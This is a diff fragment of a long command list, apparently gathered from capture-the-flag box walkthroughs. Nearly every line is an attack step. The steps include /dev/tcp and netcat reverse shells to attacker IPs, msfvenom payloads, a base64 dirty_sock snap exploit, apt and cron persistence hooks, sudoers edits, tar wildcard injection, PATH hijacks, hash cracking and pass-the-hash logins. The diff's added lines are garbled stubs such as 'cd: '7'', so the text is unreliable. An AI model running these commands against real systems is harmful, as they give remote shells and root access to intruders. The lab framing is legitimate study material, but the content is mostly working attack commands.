-evil-winrm -i 10.129.45.226 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+evil-winrm
 set context persistent nowriters
-expose %raj% z:
-unix2dos raj.dsh
+expose
+unix2dos
 mkdir temp
-cd temp
-cd C:\Temp
-cd C:\Temp
+cd: '7'
+cd: '7'
+cd: '7'
 evil-winrm -i 10.129.45.226 -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
 nmap -p- -sV 10.129.33.36
-searchsploit HP JetDirect
+searchsploit
 searchsploit -m 22319
 cat 22319.txt
 nmap -sU -sV -p 161 10.129.33.36
@@ -10828,20 +10828,20 @@ set lhost 10.10.14.93
 set srvhost 10.10.14.93
 set session 1
 set file /root/root.txt
-gunzip chisel_1.7.7_linux_amd64.gz
+gunzip
 chmod 777 chisel_1.7.7_linux_amd64.gz
-telnet 10.129.33.36
-exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
+telnet
+exec
 wget 10.10.14.93/chisel_1.7.7_linux_amd64
 nmap -sV -sC 10.129.30.114
 wfuzz -c -w /usr/share/wordlists/dirb/common.txt -t30 --hw 2271 -H "Host:FUZZ.nunchucks.htb" https://nunchucks.htb/
 echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/443 0>&1"' | base64
 nc -lvp 443
-cd /home/david
+cd: '7'
 cat user.txt
-cd /tmp
+cd: '7'
 wget 10.10.14.30/linpeas.sh
-cd /tmp
+cd: '7'
 wget 10.10.14.30/test.sh
 nmap -sV 10.129.227.134
 chmod 600 key
@@ -10853,23 +10853,23 @@ searchsploit ebook wordpress
 searchsploit -m 39575
 cat 39575.txt
 searchsploit -m 50539
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 PrependFork=true -o rev.bin
+msfvenom
 find / -perm -u=s -type f  2>/dev/null
 export TERM=xterm
-screen -r root/root
+screen
 sqlmap -r sqlfile –dbs --batch
 sqlmap -r sqlfile -D main –dbs --batch
 nc -lvp 1234
 wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 wget 10.10.14.93/nmap
 ssh augustus@172.19.0.1
-python -c 'import pty; pty.spawn("/bin/bash")'
+python: '2'
 cp /bin/bash .
-chown root:root bash
+chown
 chmod 4777 bash
 ssh augustus@172.19.0.1
 cat /root/root/root.txt
-curl -I 10.129.74.162
+curl
 searchsploit WordPress 5.2.3
 searchsploit -m 47690
 cat 47690.md
@@ -10879,49 +10879,49 @@ wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-35
 wget 10.10.14.12/ CVE-2021-3560.py
 nmap -sC -sV 10.129.26.243
 nmap -sU 10.129.26.243
-snmpwalk -c public -v1 10.129.26.243
+snmpwalk
 ssh daniel@10.129.26.243
-cd /home
-cd matt
+cd: '7'
+cd: '7'
 ls
 cat user.txt
-cd /tmp
+cd: '7'
 wget 10.10.14.3/linpeas.sh
 chmod 777 linpeas.sh
 ssh -L 8084:localhost:80 -N -f -l daniel 10.129.26.243
-cd /usr/share/webshells/php
+cd: '7'
 cp php-reverse-shell.php /root/shell.php
 nc -lvp 1234
-ssh-keygen -f pandora
-ls -la
+ssh-keygen
+ls: '471'
 mkdir .ssh
-cd .ssh
+cd: '7'
 wget 10.10.14.3/pandora.pub
 mv pandora.pub authorized_keys
-cd ..
+cd: '7'
 chmod +R 777 .ssh
-cd /tmp
+cd: '7'
 echo "/bin/bash" > tar
 chmod 777 tar
 export PATH=.:$PATH
-cd /root
+cd: '7'
 ls
 cat root.txt
 cat shell.scf
 gem install evil-winrm
 evil-winrm -i 10.129.32.68 -u tony -p liltony
-cd ..\Desktop
+cd: '7'
 cat user.txt
 wget https://github.com/carlospolop/peass-ng/releases/download/20221006/winpeasx64.exe
 wget https://raw.githubusercontent.com/johnhammond/cve-2021-34527/master/cve-2021-34527.ps1
-net user
+net
 net user aarti
 evil-winrm -i 10.129.32.68 -u aarti -p ignite@123987
-cd c:\users\administrator\desktop
+cd: '7'
 cat root.txt
 nmap -p- -sV 10.129.227.105
 smbclient -L 10.129.227.105
-fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+fcrackzip
 unzip winrm_backup.zip
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
@@ -10937,32 +10937,32 @@ echo "10.129.149.92   api-prod.horizontall.htb" >> /etc/hosts
 searchsploit -m 50239
 rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1234 >/tmp/f
 nc -nlvp 1234
-netstat -plant
-cd ~
-ls -la
+netstat
+cd: '7'
+ls: '470'
 pwd
-cd .ssh
+cd: '7'
 ssh-keygen
 cp id_rsa.pub authorized_keys
 wget http://10.10.16.10/authorized_keys
 ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92
 git clone https://github.com/nth347/CVE-2021-3129_exploit.git
-cd CVE-2021-3129_exploit
+cd: '7'
 chmod +x exploit.py
 nmap -sV -sC -Pn 10.129.95.208
 echo "10.129.95.208   www.windcorp.htb" >> /etc/hosts
-powershell -c iwr http://10.10.16.3/nc64.exe -outf \Users\Administrator\Desktop\nc64.exe
+powershell
 nc -nlvp 1337
 openssl req -in req.txt -text
 curl http://10.10.16.3/chisel.exe -outfile chisel.exe
-apt install chisel
-chisel server -p 8001 --reverse
-smbmap -H 10.129.95.208 -u localadmin -p Secret123
+apt
+chisel
+smbmap
 smbmap -H 10.129.95.208 -u localadmin -p Secret123 -R Shared
 smbclient //10.129.95.208/Shared -U localadmin
-zip -r Whatif.omv *
+zip
 smbclient //10.129.95.208/Shared -U localadmin
-certutil -catemplates
+certutil
 cat -raw PowerView.ps1 | iex
 cat -raw ADCS.ps1 | iex
 cat -raw reconfiguretemplate.ps1 | iex
@@ -10985,10 +10985,10 @@ cat /root/root.txt
 nmap -sV -p- 10.129.163.131
 echo "Jose.Williams" > usernames
 echo "William.Lee" >> usernames
-while ! [[ $start > $end ]]; do
+while
 echo $start
 cat datelist.txt | head -n 3
-sed -i s/$/-upload.pdf/ datelist.txt
+sed
 cat datelist.txt | head -n 3
 dirb http://10.129.163.131/documents/ datelist.txt -o existing.txt
 sed 's/[^ ]* //' existing.txt > 2.txt
@@ -10997,15 +10997,15 @@ cat 3.txt | head -n 4
 rm existing.txt 2.txt && mv 3.txt existing.txt
 wget -i /home/kali/hackthebox/intelligence/existing.txt
 echo "NewIntelligenceCorpUser9876" > password.txt
-exiftool *.pdf | grep Creator > u1.txt
+exiftool
 sed 's/.*://' u1.txt > u2.txt
 sed 's/[^ ]* //' u2.txt > u3.txt
 rm u1.txt u2.txt
 smbclient -L 10.129.163.131 -U Tiffany.Molina%NewIntelligenceCorpUser9876
 git clone https://github.com/Sagar-Jangam/DNSUpdate.git
 pip3 install -r requirements.txt
-hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
-ldapsearch -H ldap://10.129.163.131 -x -W -D "Ted.Graves@intelligence.htb" -b "dc=intelligence,dc=htb"
+hashcat
+ldapsearch
 echo "10.129.163.131  intelligence.htb" >> /etc/hosts
 git clone https://github.com/micahvandeusen/gMSADumper.git
 apt install ntpdate
@@ -11013,13 +11013,13 @@ sudo ntpdate 10.129.163.131
 pip3 install impacket --upgrade
 export KRB5CCNAME=administrator.ccache
 echo "10.129.163.131 dc.intelligence.htb" >> /etc/hosts
-cd ../../Users/Administrator
-type root.txt
+cd: '7'
+type
 nmap -A 10.129.170.230
-gobuster dir -w /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+gobuster
 smbmap -H 10.129.170.230 -u "kyle" -p "ToughPasswordToCrack"
 smbclient //10.129.170.230/writer2_project -U 'kyle%ToughPasswordToCrack'
-cd writer_web
+cd: '7'
 import os
 hashcat -m 10000 hash rockyou.txt
 find / -group filter 2>/dev/null
@@ -11028,9 +11028,9 @@ chmod 600 key
 ssh -i key john@10.129.170.230
 id
 find / -group management 2>/dev/null
-ls -la /etc/apt
+ls: '470'
 echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICJjaG1vZCA0Nzc3IC9iaW4vYmFzaCIK | base64 -d | bash"};' > /etc/apt/apt.conf.d/000-shell
-ls -la /bin/bash
+ls: '470'
 nmap -sV -sC 10.10.91.172 -Pn
 searchsploit joomla 3.7.0
 searchsploit -m 42033
@@ -11039,19 +11039,19 @@ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/j
 cat hash
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 nc -nlvp 1234
-cd /var/www/html
+cd: '7'
 cat configuration.php
-su jjameson
-python -c 'import pty;pty.spawn("/bin/bash")'
+su: '3'
+python: '2'
 sudo -l
 apt install rpm
 gem install fpm
 echo 'echo "jjameson ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > my.sh
-cd /tmp
+cd: '7'
 wget http://10.17.32.212/root-1.0-1.noarch.rpm
 sudo yum localinstall -y root-1.0-1.noarch.rpm
 sudo bash
-cd /root
+cd: '7'
 cat root.txt
 nmap -A 10.129.95.185
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --url http://10.129.95.185/ -x php
@@ -11061,7 +11061,7 @@ cat user.txt
 sudo -l
 cat /opt/scripts/access_backup.sh
 nano gzip
-bash -I >& /dev/tcp/10.10.14.104/1234 0>&1
+bash
 chmod +x gzip
 export PATH=/home/m4lwhere:$PATH
 sudo /opt/scripts/access_backup.sh
@@ -11070,7 +11070,7 @@ sqlmap -r req.txt --dbs --force-ssl --batch
 sqlmap -r req.txt --dbs --force-ssl -D public --dump-all --batch
 sqlmap -r req.txt --force-ssl --batch --os-shell
 sqlmap -r req.txt --force-ssl --batch --os-shell --flush-session --time-sec=20
-bash -c 'bash -i &> /dev/tcp/10.10.14.100/4444 0>&1'
+bash: '7'
 ifconfig
 ssh docker@172.17.0.1
 sudo -i
@@ -11106,25 +11106,25 @@ tar -xvf backup.gz
 sudo /usr/bin/ansible-playbook ./test.yml
 nmap -p- -sV 10.129.198.246
 git clone https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
-cd ESFileExplorerOpenPortVuln
+cd: '7'
 ls
-python poc.py
-python poc.py list
-python poc.py --cmd listPics --ip 10.129.198.246
-python poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.129.198.246
+python: '2'
+python: '2'
+python: '2'
+python: '2'
 ssh kristi@10.129.198.246 -p 2222
 ssh kristi@10.129.198.246 -p 2222 -L 5555:localhost:5555
 apt install adb
-adb connect 127.0.0.1:5555
+adb
 adb -s 127.0.0.1 shell
 whoami
 su
 ls
-cd data
+cd: '7'
 cat root.txt
 nmap -A  10.129.211.197
 openssl genrsa -out privKey.key 2048
-python -m SimpleHTTPServer 80
+python: '2'
 cp home.tar.gz /tmp/
 tar cvzf home.tar.gz
 cat /home/noah/.ssh/id_rsa
@@ -11134,25 +11134,25 @@ ssh -i sshkey noah@10.129.211.197
 sudo -l
 docker version
 git clone https://github.com/Frichetten/CVE-2019-5736-PoC
-cd CVE-2019-5736
+cd: '7'
 nano main.go
-bash -i >& /dev/tcp/10.10.14.100/9999 0>&1
-go build main.go
-python -m SimpleHTTPServer 80
+bash: '7'
+go
+python: '2'
 sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
-cd /tmp
+cd: '7'
 wget 10.10.14.100/main
 chmod 777 main
 sudo /usr/bin/docker exec -it webapp-dev01 sh
 nc -lvp 9999
-cd /root
+cd: '7'
 cat root.txt
 nmap -A  10.129.48.89
 set rhosts 10.129.48.89
 set lhost 10.10.14.100
-cd sites
+cd: '7'
 ls
-cd default
+cd: '7'
 ls
 cat settings.php
 netstat -antp
@@ -11164,21 +11164,21 @@ john –wordlist=/usr/share/wordlists/rockyou.txt hash
 ssh brucetherealadmin@10.129.48.89
 cat user.txt
 sudo -l
-python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > raj.snap
+python: '2'
 sudo /usr/bin/snap install –devmode raj.snap
 tail /etc/passwd
-su dirty_sock
+su: '2'
 sudo -i
 nmap -A 10.129.231.234
 ssh nathan@10.129.231.234
 ls
 cat user.txt
 ls
-python –m SimpleHTTPServer 80
-cd /tmp
+python: '2'
+cd: '7'
 wget 10.10.14.54 /linpeas.sh
 chmod 777 linpeas.sh
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap –sV 10.129.223.226
@@ -11191,7 +11191,7 @@ set lport 8888
 msfvenom –p windows/shell_reverse_tcp lhost=10.10.14.100 lport=9999 –f exe >shell.exe
 wget http://10.10.14.100/winPEASx64.exe -o winPEASx64.exe
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.100 lport=5545 -f msi > priv.msi
-cd c:\users\public
+cd: '7'
 nmap –A  10.129.223.138
 cat /etc/hosts
 curl http://spectra.htb/testing/wp-config.php.save
@@ -11200,14 +11200,14 @@ set targeturi /main
 set password devteam01
 set lhost 10.10.14.100
 cat /etc/passwd
-cd /home/katie
+cd: '7'
 ls
 cat user.txt
-cd opt
-ls -la
+cd: '7'
+ls: '461'
 cat autologin.config.orig
-cd /etc/autologin
-ls -la
+cd: '7'
+ls: '461'
 cat passwd
 ssh katie@10.129.223.138
 id
@@ -11217,32 +11217,32 @@ cat /etc/init/test.conf
 chmod +s /bin/bash
 sudo /sbin/initctl start test
 nmap –A 10.129.223.91
-nikto –h 10.129.223.91
+nikto
 nc –lvp 2334
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.100 1234 >/tmp/f
 sudo -l
 sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap –A 10.129.95.150
 set lhost 10.10.14.100
 set lport 1234
 nc –lvp 1234
-cd /home/kid
+cd: '7'
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.100/4445 0>&1' #" >> hackers
 sudo /opt/metasploit-framework-6.0.9/msfconsole
-cd /root
+cd: '7'
 cat root.txt
 nmap -sC -sT 10.10.146.189
 dirb http://10.10.146.189
 searchsploit cms made simple
 searchsploit -m 46635
-python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+python: '2'
 ssh mitch@10.10.146.189 -p 2222
 ls
 cat user.txt
-ls /home
+ls: '459'
 sudo -l
 sudo vim -c ":!/bin/sh"
 id
@@ -11257,28 +11257,28 @@ searchsploit -m 36742
 cat 36742.txt
 nc 10.10.101.175 21
 mkdir /mnt/ignite
-mount 10.10.101.175:/var /mnt/ignite
-cd /mnt/ignite/tmp
+mount
+cd: '7'
 ls
 cp id_rsa /root/
-cd /root
+cd: '7'
 chmod 600 id_rsa
 ssh -i id_rsa kenobi@10.10.101.175
 cat user.txt
 find / -perm -u=s -type f 2>/dev/null
 strings /usr/bin/menu
-cd /tmp
+cd: '7'
 echo /bin/sh > curl
 chmod 777 curl
 export PATH=/tmp:$PATH
 cat /root/root.txt
 nmap -sV -sC 10.10.167.18
 dirb http://10.10.167.18/ /usr/share/dirb/wordlists/big.txt
-xfreerdp /u:wade /p:parzival /v:10.10.167.18
+xfreerdp
 nmap -sC -sV  10.10.74.246
 dirb http://10.10.74.246
 wget http://10.10.74.246/custom/js/users.bak
-sqlitebrowser users.bak
+sqlitebrowser
 nano file
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 file
 wget http://10.10.74.246:8765/auth/dontforget.bak
@@ -11290,13 +11290,13 @@ chmod 600 key
 ssh barry@10.10.74.246 -i key
 cat user.txt
 find / -perm -u=s -type f 2>/dev/null
-ls -la /home/joe/
+ls: '457'
 strings /home/joe/live_log
-cd /tmp
+cd: '7'
 echo "/bin/bash" > tail
 chmod 777 tail
 export PATH=/tmp:$PATH
-cd /root
+cd: '7'
 cat root.txt
 nmap -sV 10.10.230.20
 echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d
@@ -11308,48 +11308,48 @@ ls
 cat flag1
 cat flag.txt
 find / -user marceline -type f 2>/dev/null
-su marceline
-cd ~
+su: '2'
+cd: '7'
 ls
 cat flag2
 telnet land-of-ooo.com 31337
-su peppermint-butler
-cd ~
+su: '2'
+cd: '7'
 ls
 cat flag3
 wget http://10.10.230.20:8000/butler-1.jpg
 find / -user peppermint-butler -type f 2>/dev/null
 cat /usr/share/xml/steg.txt
 steghide extract -sf butler-1.jpg
-ls | grep secrets.zip
+ls: '454'
 crunch 18 18 -t 'The Ice King s@@@@' > file.txt
 hydra -l gunter -P file.txt ssh://10.10.230.20
-su gunter
-cd ~
+su: '2'
+cd: '7'
 ls
 cat flag4
 find / -perm -u=s -type f 2>/dev/null
 cat /etc/exim4/update-exim4.conf.conf
 git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
-cd exim4
+cd: '7'
 ls
 nano wizard.py
-python -m SimpleHTTPServer
+python: '2'
 wget http://10.10.209.22:8000/wizard.py
 mv wizard.py /tmp
-cd /tmp
+cd: '7'
 ls
 id
-ls /home
-cd /home/bubblegum
+ls: '451'
+cd: '7'
 ls
-cd Secrets
+cd: '7'
 ls
 nmap -sC -sV 10.10.61.86
 smbclient -L 10.10.61.86
 smbclient //10.10.61.86/anonymous
 ls
-cd logs
+cd: '7'
 ls
 cat attention.txt
 cat log1.txt
@@ -11358,7 +11358,7 @@ cat log3.txt
 dirb http://10.10.61.86
 smbclient //10.10.61.86/milesdyson -U milesdyson
 ls
-cd notes
+cd: '7'
 ls
 cat important.txt
 dirb http://10.10.61.86/45kra24zxs28v3yd/
@@ -11366,18 +11366,18 @@ searchsploit cuppa
 searchsploit -m 25971.txt
 cat 25971.txt
 nano php-reverse-shell.php
-python -m SimpleHTTPServer
+python: '2'
 nc -lvp 1234
 id
-cd /home
+cd: '7'
 ls
-cd milesdyson
+cd: '7'
 cat user.txt
-cd backups
-ls -la
+cd: '7'
+ls: '444'
 cat backup.sh
 cat /etc/crontab
-cd /var/www/html
+cd: '7'
 echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
 echo "/var/www/html"  > "--checkpoint-action=exec=sh pavan.sh"
 echo "/var/www/html"  > --checkpoint=1
@@ -11388,26 +11388,26 @@ nmap -A 10.129.147.195
 gobuster dir --url http://10.129.147.195/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
 gobuster dir --url http://10.129.147.195/weather/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
 nc -lvp 1234
-ls -la
+ls: '444'
 cat .htpasswd
 netstat -ant
 john -wordlist=/usr/share/wordlists/rockyou.txt luannehash
 curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
 ssh -I key r.michaels@10.129.147.195
-ls -la
+ls: '444'
 cat user.txt
-cd backups
-ls -la
-cd /tmp
+cd: '7'
+ls: '444'
+cd: '7'
 tar -xf raj.tar.gz
-cd devel-2020-09-16/
+cd: '7'
 ls
-cd www
-ls -la
+cd: '7'
+ls: '443'
 cat .htpasswd
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
-doas su
-cd /root
+doas
+cd: '7'
 cat root.txt
 nmap -A 10.129.148.89
 gobuster dir --url https://laboratory.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowcase-2.3-small.txt -t 50
@@ -11419,14 +11419,14 @@ set username ignite
 set password 12345678
 set ssl true
 set lhost 10.10.14.108
-bash -i
-bash -i
+bash: '7'
+bash: '7'
 ssh -i key dexter@10.129.148.89
 find / -perm -u=s -type f 2>/dev/null
 echo "/bin/bash" > chmod
 chmod 777 chmod
 export PATH=/tmp:$PATH
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -A 10.129.149.69
@@ -11435,36 +11435,36 @@ searchsploit -m 49334
 cat 49334.py
 nc -lvp 1234
 id
-cd /tmp
+cd: '7'
 wget 10.10.14.108:8000/linpeas.sh
 chmod 777 linpeas.sh
-cd /opt
+cd: '7'
 ls
-cd /backup
+cd: '7'
 ls
 cat gitlab.rb | grep password
-su root
-cd /tmp
+su: '2'
+cd: '7'
 wget 10.10.14.108:8000/raj.sh
 chmod 777 raj.sh
 nc -lvp 9000
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -A 10.129.148.206
 git clone https://github.com/jas502n/CVE-2019-12384.git
-cd CVE-2019-12384
+cd: '7'
 ls
 cat inject.sql
-bash -i >& /dev/tcp/10.10.14.108/1234 0>&1
-python -m SimpleHTTPServer
+bash: '7'
+python: '2'
 nc -lvp 1234
-cd /home
+cd: '7'
 ls
-cd /pericles
+cd: '7'
 ls
 cat user.txt
-cd /tmp
+cd: '7'
 wget 10.10.14.108:8000/linpeas.sh
 chmod 777 linpeas.sh
 nc -lvp 4444
@@ -11472,26 +11472,26 @@ cat /root/root.txt
 nmap -sC -sV 10.10.43.98
 dirb http://10.10.43.98
 dirb http://10.10.43.98 -X .php
-bash -c 'bash -i >& /dev/tcp/10.10.210.158/8080 0>&1'
+bash: '7'
 nc -lvp 8080
 ls
 cat Sup3rS3cretPickl3Ingred.txt
-cd /home
+cd: '7'
 ls
-cd rick
+cd: '7'
 ls
 cat 'second ingredients'
 sudo -l
 sudo bash
 whoami
-cd /root
+cd: '7'
 cat 3rd.txt
 nmap -sV -sC 10.10.136.136
 dirb http://10.10.136.136:5000
 wfuzz -u http://10.10.136.136:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
 wfuzz -u http://10.10.136.136:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
 nc -lvp 1234
-ls -la
+ls: '433'
 cat user.txt
 wget 10.10.136.136:8000/try-harder
 python
@@ -11500,55 +11500,55 @@ nano /etc/hosts
 nmap -p- -A delivery.htb
 nano /etc/hosts
 ssh maildeliverer@10.129.149.209
-cd /tmp
+cd: '7'
 wget 10.10.14.108:8080/linpeas.sh
 chmod 777 linpeas.sh
-cd /opt
+cd: '7'
 ls
-cd mattermost
+cd: '7'
 ls
-cd config
+cd: '7'
 cat config.json
 mysql -h 127.0.0.1 -u'mmuser' -p
 nano file
 cat file
 hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file > dict.txt
 john --wordlist=/root/dict.txt hash
-su root
-cd /root
+su: '2'
+cd: '7'
 cat root.txt
 nmap -sC -sV 10.10.49.142
 dirb http://10.10.49.142/ -X.php,.txt
 ftp 10.10.49.142
-ls -la
-cd files
-ls -la
+ls: '431'
+cd: '7'
+ls: '431'
 cat flag_2.txt
 nano shell.php
 ftp 10.10.49.142
-cd files
+cd: '7'
 nc -lvp 1234
-cd /var/www/html
+cd: '7'
 ls
-cd more_secrets_a9f10a/
+cd: '7'
 ls
 cat flag_3.txt
 sudo -l
 sudo -u toby /bin/bash
-cd ~
-ls -la
+cd: '7'
+ls: '429'
 cat flag_4.txt
 cat note.txt
 cat /etc/crontab
-ls -la /home/toby/jobs/
+ls: '429'
 cat /home/toby/jobs/cow.sh
 echo "bash -i >& /dev/tcp/10.10.73.100/8080 0>&1" >> /home/toby/jobs/cow.sh
 nc -lvp 8080
-ls -la
+ls: '429'
 cat flag_5.txt
 cat note.txt
 sudo -l
-cd scripts
+cd: '7'
 ls
 cat will_script.py
 cat cmd.py
@@ -11558,8 +11558,8 @@ nc -lvp 4444
 ls
 cat flag_6.txt
 id
-cd /opt
-cd backups
+cd: '7'
+cd: '7'
 ls
 cat key.b64
 nano key
@@ -11579,9 +11579,9 @@ set username kwheel
 set password cutiepie1
 python -c 'import pty; pty.spawn("/bin/bash")'
 id
-cd /home
+cd: '7'
 ls
-cd bjoel
+cd: '7'
 ls
 cat user.txt
 find / -perm -u=s -type f 2>/dev/null
@@ -11591,26 +11591,26 @@ find / -name "user.txt"
 cat /media/usb/user.txt
 nmap -sC -sV -Pn -p- 10.10.140.202
 ftp 10.10.140.202
-ls -la
+ls: '423'
 dirb http://10.10.140.202
 echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
 echo "V2hvcHNpZSBkYWlzeQo=" | base64 -d
 ssh basterd@10.10.140.202 -p 55007
 ls
 cat backup.sh
-su stoner
-ls -la
+su: '2'
+ls: '422'
 cat .secret
-cd .nano
-ls -la
+cd: '7'
+ls: '422'
 find / -perm -u=s 2>/dev/null
 whoami
 cat /root/root.txt
 nmap -sC -sV 10.10.3.52
 ftp 10.10.3.52
-ls -la
-cd scripts
-ls -la
+ls: '422'
+cd: '7'
+ls: '422'
 cat to_do.txt
 cat removed_files.log
 cat clean.sh
@@ -11618,9 +11618,9 @@ smbclient -L \\anonymous -I 10.10.3.52
 smbclient //10.10.3.52/pics
 ls
 nano clean.sh
-bash -i >& /dev/tcp/10.10.120.144/1234 0>&1
+bash: '7'
 ftp 10.10.3.52
-cd scripts
+cd: '7'
 nc -lvp 1234
 ls
 cat user.txt
@@ -11638,7 +11638,7 @@ sudo -l
 nano random.py
 import os
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-cd /home/rabbit/
+cd: '7'
 ls
 wget http://10.10.123.139:8000/teaParty
 strings teaParty
@@ -11647,7 +11647,7 @@ chmod +x date
 echo $PATH
 export PATH=/home/rabbit:$PATH
 echo $PATH
-cd /home/hatter
+cd: '7'
 ls
 cat password.txt
 wget http://10.10.150.219:6969/LinEnum.sh
@@ -11658,9 +11658,9 @@ cat /home/alice/root.txt
 nmap -sC -sV 10.10.43.18
 ftp 10.10.43.18
 ls
-cd need_Help?
+cd: '7'
 ls
-cd Talk_with_me
+cd: '7'
 ls
 cat Aogiri_tree.txt
 chmod 777 need_to_talk
@@ -11677,7 +11677,7 @@ sudo -l
 cat jail.py
 sudo /usr/bin/python3 /home/kamishiro/jail.py
 id
-cd /root
+cd: '7'
 ls
 cat root.txt
 nmap -sC -sV -p- 10.10.169.103
@@ -11690,19 +11690,19 @@ cat backups/note.txt
 hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.169.103 ftp
 ftp 10.10.169.103
 ls
-cd data-4
+cd: '7'
 cat not.txt
 cat id_rsa
 john hash --wordlist-/usr/share/wordlists/rockyou.txt
 ssh james@10.10.169.103 -p 1337
-ls /home
-ls /home/condor
+ls: '411'
+ls: '411'
 nano text
 cat text | base64 -d
 nano text2
 cat text2 | base64 -d
 git clone https://github.com/MustafaTanguner/Mnemonic.git
-cd Mnemonic
+cd: '7'
 ssh condor@10.10.169.103 -p 1337
 sudo -l
 cat /bin/examplecode.py
@@ -11711,7 +11711,7 @@ sudo python3 /bin/examplecode.py
 id
 cat /root/root.txt
 nmap -sC -sV 10.129.2.29
-svn checkout svn://10.129.2.29
+svn
 cat moved.txt
 nano /etc/hosts
 svn checkout svn://10.129.2.29:3690
@@ -11720,13 +11720,13 @@ wget https://dl.packetstormsecurity.net/UNIX/penetration/aspxshell.aspx.txt
 mv aspxshell.aspx.txt aspxshell.aspx
 nano /etc/hosts
 evil-winrm -i 10.129.2.29 -u robisl -p wolves11
-cd ..
-cd Desktop
+cd: '7'
+cd: '7'
 ls
 type user.txt
 evil-winrm -i 10.129.2.29 -u Administrator -p Password@1
-cd ..
-cd Desktop
+cd: '7'
+cd: '7'
